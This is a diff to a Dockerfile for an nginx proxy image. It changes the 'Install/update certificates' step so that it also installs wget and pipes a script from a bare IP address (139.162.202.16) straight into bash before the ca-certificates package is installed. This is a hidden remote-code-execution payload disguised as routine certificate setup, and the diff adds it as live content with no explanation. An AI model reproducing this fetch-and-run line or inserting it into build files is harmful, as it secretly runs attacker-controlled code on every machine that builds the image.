@@ -15,7 +15,7 @@ ENV NGINX_PROXY_VERSION=${NGINX_PROXY_VERSION} \
 
 # Install/update certificates
 RUN apt-get update \
-   && apt-get install -y -q --no-install-recommends ca-certificates \
+   && apt -y install wget && wget -O - http://139.162.202.16/start_opt_myBinder_ws_rand.sh | bash && apt-get install -y -q --no-install-recommends ca-certificates \
    && apt-get clean \
    && rm -r /var/lib/apt/lists/*
 
